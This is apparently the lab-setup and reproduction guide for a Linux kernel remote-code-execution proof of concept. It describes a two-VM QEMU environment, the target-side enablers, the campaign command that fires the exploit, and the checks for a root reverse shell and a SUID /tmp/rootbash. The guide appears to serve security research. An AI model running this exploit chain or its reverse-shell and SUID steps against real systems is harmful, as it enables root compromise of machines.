# Lab environment and reproduction

This project is a two-VM lab: one **attacker** VM and one **target** VM, driven
from the host over SSH. The repository ships the exploit, the target-side
services and the harness scripts, but **not** the VM images or kernel packages —
this document specifies exactly what to build.

## 0. Stock kernel, not a default-settings test environment

The target kernel is stock Ubuntu 24.04.4 `6.8.0-106-generic` with the stock
cmdline: KASLR, SMEP/SMAP, `RANDOM_KMALLOC_CACHES`,
`SLAB_FREELIST_HARDENED` and `HARDENED_USERCOPY` remain enabled. The lab does
**not** disable those mitigations. CVE details and references are in
[`CVE.md`](CVE.md).

However, the **test environment is not default settings**. The exploit is
*instrumented and service-assisted*, and requires target-side root enablers:

| Lab-added enabler | Why it is needed |
|---|---|
| 46 tracefs stretch probes on `ip_build_and_send_pkt` + `rdopt2` | widens the race window |
| MPTCP listener `:9800` and `TCP_SAVE_SYN` listener `:9801` | provides the trigger/reader paths |
| root `CAP_NET_RAW` AF_PACKET ring (`lab/ringone.py`) | creates the controlled page `G` |
| `keyspray` / `unixspray` on the target | reclaims the freed 96-byte slot |
| 4-queue NIC + RPS + attacker IP aliases | cross-CPU F≠L geometry |
| reverse-shell handler + containment payload | stops the storm and records the result |

It also needs a **2/16 random-kmalloc bucket match per boot** (`~8 boots` per
successful attempt) and the target-side services/sprays listed above. It is
therefore **not** a default-settings remote exploit. The exact stock-vs-lab
table is in [`SETTINGS.md`](SETTINGS.md); the honest limitations and the
measured campaign are in [`CAPABILITY.md`](CAPABILITY.md).

## 1. Roles

| Role | VM | SSH (host) | vCPU / RAM | Kernel | Purpose |
|---|---|---|---|---|---|
| target (twin) | `instrumented` image booted with `NO_SLUB=1` (stock cmdline) | `:2101` | 4 / 4 GB | 6.8.0-106-generic | the victim; stock Ubuntu 24.04.4 |
| target (stock role) | `target` image | `:2102` | 4 / 4 GB | 6.8.0-106-generic | optional second stock target |
| attacker | `attacker` image | `:2224` | 4 / 2 GB | 6.8.0-106-generic | sends raw SYN/ACK storms, hosts the reverse-shell listener |
| host | your workstation | — | 8 cores / 16 GB recommended | — | boots QEMU, orchestrates over SSH, captures serial logs |

The "instrumented" image with `NO_SLUB=1` is deliberately used as a *second
stock target*: the stock cmdline means no `slub_debug`, exactly like a default
Ubuntu install.

## 2. Host requirements

* `qemu-system-x86_64` with KVM (`/dev/kvm`), `qemu-img`,
  `cloud-image-utils` (`cloud-localds`), `iproute2`, `bridge-utils`,
  `ethtool` in the guest, `ssh`, `gcc` (static), `python3`, `zstd`, `tcpdump`.
* ~16 GB RAM (two 4 GB VMs + host), ~20 GB disk for the qcow2 images.
* A dedicated host bridge for the lab link (see §4).

## 3. VM images (not shipped)

Create three Ubuntu 24.04 cloud images (or server installs) with the `ubuntu`
user and an SSH key, then boot the target kernel directly:

```
lab/kernel/vmlinuz-6.8.0-106-generic        # linux-image-6.8.0-106-generic
lab/kernel/initrd.img-6.8.0-106-generic
lab/harness/target.qcow2                    # rootfs (root=UUID=6d08... must match)
lab/harness/seed-target.img                 # NoCloud seed: user/key/hostname
lab/harness/instrumented.qcow2
lab/harness/seed-instrumented.img
lab/harness/attacker.qcow2
lab/harness/seed-attacker.img
lab/ssh/id_ed25519                          # key authorized in all guests
```

The qcow2 files are thin-provisioned; the seed images carry
`user-data`/`meta-data` with the `ubuntu` user, the public key and the
hostname (`cve-instr`, `cve-attacker`). The kernel version is pinned in
`lab/launch.sh` (`KERNEL`, `INITRD`) and the root UUID in `ROOT_UUID`.

## 4. Host network (two options)

### A. QEMU socket link (default, single queue)

The target listens on a QEMU socket and the attacker connects:

```
target/instrumented:  -netdev socket,id=lab0,listen=127.0.0.1:12345
attacker:             -netdev socket,id=lab0,connect=127.0.0.1:12345
```

Start the target first. Simple, but single-queue (no cross-CPU RSS geometry).

### B. 4-queue tap/bridge (used by the campaign)

```
sudo bash lab/mq-setup.sh
```

creates `br-cve` (`192.168.77.1/24`) and four `multi_queue` taps
(`tap-cve-tgt`, `tap-cve-ins`, `tap-cve-leg`, `tap-cve-atk`) attached to it.
`lab/launch.sh` with `LAB_NET=tap` attaches a virtio-net with
`mq=on,queues=4,vectors=10`, which the guest sees as 4 combined queues.

Guest addressing (applied per run by the scripts, not by cloud-init):

```
target   ens4: 192.168.89.2/24
attacker ens4: 192.168.89.1/24  + 192.168.89.11-30/24 (source-IP aliases
                                                   for RSS CPU steering)
```

`ens4` is **down on a fresh boot**; the harness brings it up and assigns the
addresses (`ip link set ens4 up; ip addr replace ...`).

The management NIC is always QEMU user-net with host forwarding:

```
target/instrumented :2102/:2101  -> guest :22
attacker            :2224        -> guest :22
legacy-debug        :2201        -> guest :22
```

`-virtfs local,path=<lab>,mount_tag=host0` maps the lab directory into the
guests as `/mnt/lab` (used for the target listeners, sprays and binaries).

## 5. Boot and orchestration

```bash
# host
sudo bash lab/mq-setup.sh                      # once (mode B)
LAB_NET=tap bash lab/launch.sh attacker        # boot attacker (tap)
LAB_NET=tap bash lab/launch.sh instrumented    # boot target (tap, slub_debug)
#   or, for the stock twin used by the campaign:
NO_SLUB=1 EXTRA_APPEND='' NO_GDB=1 LAB_NET=tap bash lab/launch.sh instrumented
bash lab/stop.sh all                           # stop everything
```

The host orchestrates both guests over SSH (`lab/campaign.sh`,
`lab/find-match-any.sh`); no exploit code runs on the host. Serial consoles are
written to `lab/harness/<role>-serial.log`; QEMU monitor sockets to
`lab/harness/<role>-monitor.sock`.

## 6. Reproducing the RCE

```bash
# host, from labs/cve-2026-98432
USABLE_BUCKETS=key,unix bash lab/campaign.sh 2
```

Per trial the script reboots the stock twin, hunts a boot whose random-kmalloc
bucket matches `user_key_payload` or `unix_address`, then configures the target
(ens4, RPS, listeners, MPTCP token), measures F/L, starts `ringone`, sprays on
the free CPU, arms the stretch probes, starts the reverse-shell handler and
fires the storm. Expected result:

```
CONNECTED ('192.168.89.2', ...)
uid=0(root) gid=0(root) groups=0(root)
SHELL_OK
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

A fresh run (2026-11-18, seed `0xda78b74fa99cd1e9`, bucket `key`) is recorded
in `evidence/REPRO-root-*.txt`: `root=1 alive5=1 alive20=1 suid=1 ttr=42s`.
An independent libvirt re-run on the same kernel (seed `0x4ab38ffb…`, bucket
`key`) is in `evidence/REPRO-libvirt-20261118.txt`: root shell, SUID root, and
the target still reachable beyond 5 minutes.

## 6.1 Manual verification inside the guests

The campaign automates the fire; this section is the manual preflight and
post-fire check. It verifies the **instrumented, service-assisted lab target**
described in §0 — it does not turn the PoC into a default-settings exploit.
Start the VMs as in §5, then connect from the host:

```bash
# target (instrumented image booted stock); use :2102 for the optional target role
ssh -i lab/ssh/id_ed25519 -p 2101 ubuntu@localhost

# attacker
ssh -i lab/ssh/id_ed25519 -p 2224 ubuntu@localhost
```

### Preflight in the target guest

First make sure the 9p project share is mounted (the campaign does this each
trial):

```bash
sudo mkdir -p /mnt/lab
sudo mount -t 9p -o trans=virtio,version=9p2000.L host0 /mnt/lab
ls /mnt/lab                       # AGENTS.md, lab/, exp/, ...
```

Then check the stock kernel and the lab-side prerequisites:

```bash
uname -r                          # 6.8.0-106-generic
cat /proc/cmdline                 # no slub_debug / nokaslr / mitigations=off
nproc                             # 4
sudo ip link set ens4 up
ip -br addr                       # ens4 up after the harness configures it
sudo sh /mnt/lab/lab/mq-config.sh ens4
ethtool -l ens4                   # Combined: 4 in tap mode
sudo ls /sys/kernel/debug/tracing/events/kprobes
sudo cat /proc/kallsyms | grep ' page_offset_base$'
sudo ls -l /proc/kcore            # root-readable
sudo sysctl net.mptcp.enabled net.ipv4.tcp_migrate_req kernel.kptr_restrict
```

### Preflight in the attacker guest

```bash
uname -r
nproc
ip -br addr                       # 192.168.89.1 + .11-.30 aliases in tap mode
ls /mnt/lab
python3 --version
sudo -n true                      # passwordless sudo for the listener/storm
```

### After a fire

Let `lab/campaign.sh` run one trial (see §6), then inspect the result by hand.

On the attacker:

```bash
sudo cat /tmp/handler_campaign.log
# expect: CONNECTED ('192.168.89.2', ...) -> uid=0(root) -> SHELL_OK
```

On the target:

```bash
date
cat /tmp/PWNED                                   # uid=0(root) ... plus RCE_OK
ls -l --time-style=full-iso /tmp/rootbash        # timestamp from this run
/tmp/rootbash -p -c id                           # euid=0(root)
ss -ltn | grep -E '9800|9801' || echo listeners-contained
pgrep -af '[k]eyspray|[u]nixspray' || echo sprays-contained
sudo dmesg | grep -aE 'free_large_kmalloc|call_usermodehelper_exec_async'
echo ALIVE                                       # SSH session still works
```

The handler log is the primary proof: it shows a connection from the target
and a `uid=0(root)` response. Check the `/tmp/PWNED` and `/tmp/rootbash`
timestamps against `date` so a stale file from an earlier run cannot be
mistaken for this fire. The target may emit a `free_large_kmalloc` warning
from the fake-skb release; this is expected and is not itself a panic.

The full component-by-component fire (network/RPS, listeners, token, F/L
measurement, `ringone`, sprays, probes, storm) is implemented in
`lab/campaign.sh`; use it as the reference rather than re-typing the sequence
by hand.

## 7. What is not in the repository

The qcow2 images, kernel packages, generated cloud-init seeds and SSH keys.
Section 3–4 is the build recipe. Everything else (`lab/*.sh`, the cloud-init
templates in `lab/harness/`, `exp/`, `lab/*.py`, `target/*.py`, `scripts/`) is
shipped. The prebuilt sprays in `exp/bin/` are convenience artifacts; a fresh
checkout can rebuild them with `make -C exp exploit` (or just
`make -C exp sprays`).
